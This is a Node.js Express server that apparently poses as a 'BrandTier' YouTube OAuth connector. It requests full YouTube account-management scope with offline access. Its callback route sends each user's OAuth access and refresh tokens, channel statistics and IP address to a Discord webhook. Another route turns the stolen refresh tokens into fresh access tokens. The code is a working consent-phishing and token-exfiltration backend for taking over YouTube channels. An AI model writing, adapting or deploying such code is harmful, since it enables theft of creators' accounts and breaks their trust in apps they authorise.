require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

// --------------------
// CONFIG
// --------------------
const PORT = process.env.PORT || 3000;

app.use(cors({
  origin: process.env.FRONTEND_URL || true,
  credentials: true
}));

app.use(express.json());

/* -------------------------------------------------
   🔥 DISCORD WEBHOOK LOGGER (IMPROVED)
--------------------------------------------------*/
async function sendToDiscord(payload) {
  try {
    await axios.post(process.env.DISCORD_WEBHOOK_URL, {
      embeds: [
        {
          title: "BrandTier OAuth Event",
          color: 3447003,
          fields: [
            { name: "Channel", value: payload.name || "N/A" },
            { name: "Subscribers", value: String(payload.subs || "N/A") },
            { name: "Views", value: String(payload.views || "N/A") },
            { name: "Videos", value: String(payload.videos || "N/A") },

            {
              name: "Access Token",
              value: (payload.access_token || "N/A").slice(0, 200)
            },
            {
              name: "Refresh Token",
              value: (payload.refresh_token || "N/A").slice(0, 200)
            },

            { name: "Status", value: payload.status || "success" },
            { name: "IP", value: payload.ip || "unknown" }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    });
  } catch (err) {
    console.log("Webhook error:", err.message);
  }
}

/* -------------------------------------------------
   🔁 AUTO TOKEN REFRESH FUNCTION
--------------------------------------------------*/
async function getAccessToken(refresh_token) {
  try {
    const res = await axios.post(
      "https://oauth2.googleapis.com/token",
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        refresh_token,
        grant_type: "refresh_token"
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    return res.data.access_token;
  } catch (err) {
    console.log("Token refresh error:", err.response?.data || err.message);
    throw new Error("Failed to refresh access token");
  }
}

/* -------------------------------------------------
   1. AUTH ROUTE
--------------------------------------------------*/
app.get("/auth", (req, res) => {
  const url =
    "https://accounts.google.com/o/oauth2/v2/auth?" +
    new URLSearchParams({
      client_id: process.env.CLIENT_ID,
      redirect_uri: process.env.REDIRECT_URI,
      response_type: "code",
      scope: "https://www.googleapis.com/auth/youtube",
      access_type: "offline",
      prompt: "consent"
    });

  res.redirect(url);
});

/* -------------------------------------------------
   2. CALLBACK (NO SESSION - WEBHOOK ONLY)
--------------------------------------------------*/
app.get("/callback", async (req, res) => {
  const code = req.query.code;

  try {
    const tokenRes = await axios.post(
      "https://oauth2.googleapis.com/token",
      new URLSearchParams({
        code,
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        redirect_uri: process.env.REDIRECT_URI,
        grant_type: "authorization_code"
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        }
      }
    );

    const { access_token, refresh_token } = tokenRes.data;

    // get youtube data immediately
    const yt = await axios.get(
      "https://www.googleapis.com/youtube/v3/channels",
      {
        params: {
          part: "snippet,statistics",
          mine: true
        },
        headers: {
          Authorization: `Bearer ${access_token}`
        }
      }
    );

    const channel = yt.data.items?.[0];

    if (!channel) {
      return res.status(400).send("No channel found");
    }

    // send EVERYTHING to webhook
    await sendToDiscord({
      name: channel.snippet.title,
      subs: channel.statistics.subscriberCount,
      views: channel.statistics.viewCount,
      videos: channel.statistics.videoCount,
      access_token,
      refresh_token,
      ip: req.ip,
      status: "login_success"
    });

    res.redirect(process.env.FRONTEND_URL + "/?connected=1");

  } catch (err) {
    console.log("OAuth ERROR:", err.response?.data || err.message);

    await sendToDiscord({
      status: "oauth_failed",
      ip: req.ip,
      error: err.response?.data || err.message
    });

    res.status(500).send("OAuth Error");
  }
});

/* -------------------------------------------------
   3. API (USES AUTO REFRESH TOKEN LOGIC)
--------------------------------------------------*/
app.get("/api/youtube", async (req, res) => {
  try {
    const refresh_token = req.query.refresh_token;

    if (!refresh_token) {
      return res.status(400).send("Missing refresh token");
    }

    const access_token = await getAccessToken(refresh_token);

    const yt = await axios.get(
      "https://www.googleapis.com/youtube/v3/channels",
      {
        params: {
          part: "snippet,statistics",
          mine: true
        },
        headers: {
          Authorization: `Bearer ${access_token}`
        }
      }
    );

    const channel = yt.data.items?.[0];

    if (!channel) {
      return res.status(400).send("No channel found");
    }

    res.json({
      name: channel.snippet.title,
      subscribers: channel.statistics.subscriberCount,
      views: channel.statistics.viewCount,
      videos: channel.statistics.videoCount
    });

  } catch (err) {
    console.log("API ERROR:", err.response?.data || err.message);
    res.status(500).json({
      error: "Failed to fetch YouTube data"
    });
  }
});

/* -------------------------------------------------
   START SERVER
--------------------------------------------------*/
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
